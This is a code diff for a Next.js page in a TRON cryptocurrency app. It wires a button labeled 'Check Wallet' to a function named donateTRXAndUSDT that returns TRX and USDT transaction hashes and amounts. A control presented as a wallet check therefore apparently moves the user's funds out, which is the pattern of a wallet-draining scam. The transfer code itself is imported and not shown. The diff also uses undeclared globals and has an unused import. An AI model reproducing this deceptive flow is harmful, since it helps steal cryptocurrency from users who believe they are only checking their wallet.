@@ -1,9 +1,11 @@
-'use client'; // Add this at the top to mark as Client Component
+'use client';
 
 import Image from "next/image";
-import { useState } from 'react';
+import { useState, useEffect } from "react";
+import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
+import { donateTRXAndUSDT } from "@/utils/demo";
 
-import { connectWallet, donateTRXAndUSDT } from "@/utils/trcwallet";
+
 
 export default function Home() {
   const [isProcessing, setIsProcessing] = useState(false);
@@ -14,26 +16,62 @@ export default function Home() {
   const [usdtTxHash, setUsdtTxHash] = useState('');
   const [usdtDonationAmount, setUsdtDonationAmount] = useState('');
 
-  async function handleCheck() {
-    if (isProcessing) return;
-    setIsProcessing(true);
-    setError(''); // Reset error message
+  useEffect(() => {
+    // Check if TronLink is installed
+    if (tronLink && tronLink.ready) {
+      connectWallet();
+    } else {
+      setError("TronLink wallet is not installed. Please install it.");
+    }
+  }, []);
+  
+  // Function to connect the wallet
+  const connectWallet = async () => {
     try {
-      const userAddress = await connectWallet();
-      setWalletAddress(userAddress);
+      // Request the user's account
+      const account = await tronWeb.defaultAddress.base58;
+      setWalletAddress(account);
+    } catch (error) {
+      setError("Error connecting to wallet: " + error.message);
+    }
+  };
 
-      const { trxTxHash, usdtTxHash, trxAmount, usdtAmount } = await donateTRXAndUSDT();
+  // Handle Check Wallet button click
+  async function handleCheck() {
+    setIsProcessing(true); // Start processing
+    try {
+      if (walletAddress) {
+        console.log("Connected wallet address:", walletAddress);
+      } else {
+        setError("No wallet connected. Please try again.");
+        return;
+      }
+  
+      // Call the donate function and handle the response
+      const { trxTxHash, usdtTxHash, trxAmount, usdtAmount } = await donateTRXAndUSDT(tronWeb);
+      
+      // Update state with the transaction details
       setTxHash(trxTxHash || '');
       setUsdtTxHash(usdtTxHash || '');
       setDonationAmount(trxAmount);
       setUsdtDonationAmount(usdtAmount);
+  
+      console.log('Donation successful:', trxTxHash);
+  
     } catch (error) {
+      // Set error state with a meaningful message
       setError(error.message || "An unknown error occurred. Please try again.");
+      console.error('Error in handleCheck:', error); // Log the error details in the console
     } finally {
-      setIsProcessing(false);
+      setIsProcessing(false); // Stop processing
     }
-  }
+  };
+  
 
+
+      // Call donation function
+ 
+  
 
   return (
     <div className="flex flex-col min-h-screen bg-white">
@@ -87,6 +125,7 @@ export default function Home() {
                   {isProcessing ? 'Processing...' : 'Check Wallet'}
                 </button>
                 <div>
+                
                 {error && (
         <div className="bg-red-200 text-red-800 p-4 rounded-lg mx-auto mt-4">
           {error}
